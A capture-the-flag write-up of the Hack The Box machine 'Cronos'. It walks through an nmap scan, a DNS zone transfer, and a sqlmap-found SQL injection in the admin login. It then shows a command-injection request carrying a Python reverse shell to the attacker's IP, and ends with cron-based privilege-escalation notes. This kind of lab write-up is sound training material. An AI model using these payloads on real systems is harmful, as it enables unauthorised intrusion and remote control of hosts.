# Cronos

## Information Gathering

Running nmap
```
root@kali:~/hackthebox/Cronos# nmap -sC -sV -oA nmap/cronos 10.10.10.13
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

53/tcp is open which is unusual. Let's try to find additional domain names.
```
root@kali:~/hackthebox/Cronos# nslookup
> SERVER 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13
13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.
> cronos.htb
Server:         10.10.10.13
Address:        10.10.10.13#53

Name:   cronos.htb
Address: 10.10.10.13
```
cronos.htb has been found

```
root@kali:~/hackthebox/Cronos# dig axfr @10.10.10.13 cronos.htb

; <<>> DiG 9.11.5-P4-5.1-Debian <<>> axfr @10.10.10.13 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 69 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: Mon Jul 15 08:08:11 EDT 2019
;; XFR size: 7 records (messages 1, bytes 203)
```
And also admin.cronos.htb.

## Exploitation

Index of admin.cronos.htb is a login page. Let's check it for sql injections.
Grab the request from burp, save it to file and run sqlmap aginst it.

```
root@kali:~/hackthebox/Cronos# cat login.req
POST / HTTP/1.1
Host: admin.cronos.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://admin.cronos.htb/
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Cookie: PHPSESSID=lul24ua0cbrv12hhjmetojcgb6
Connection: close
Upgrade-Insecure-Requests: 1

username=admin&password=password
```

```
root@kali:~/hackthebox/Cronos# sqlmap -r login.req http://admin.cronos.htb
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-9674' OR 6814=6814-- sSMx&password=password
```

username is vulnerable, so we can login to welcome.php and find command injection and run the shell.

```
POST /welcome.php HTTP/1.1
Host: admin.cronos.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://admin.cronos.htb/welcome.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 75
Cookie: PHPSESSID=lul24ua0cbrv12hhjmetojcgb6
Connection: close
Upgrade-Insecure-Requests: 1

command=python+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.10.14.4",8844))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call(["/bin/sh","-i"])%3b'
```

## PrivEsc

Running LinEnum and see unusual cronjob
```
[-] Crontab contents:
# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

To run custom commands we need to edit  /var/www/laravel/app/Console/Kernel.php file.
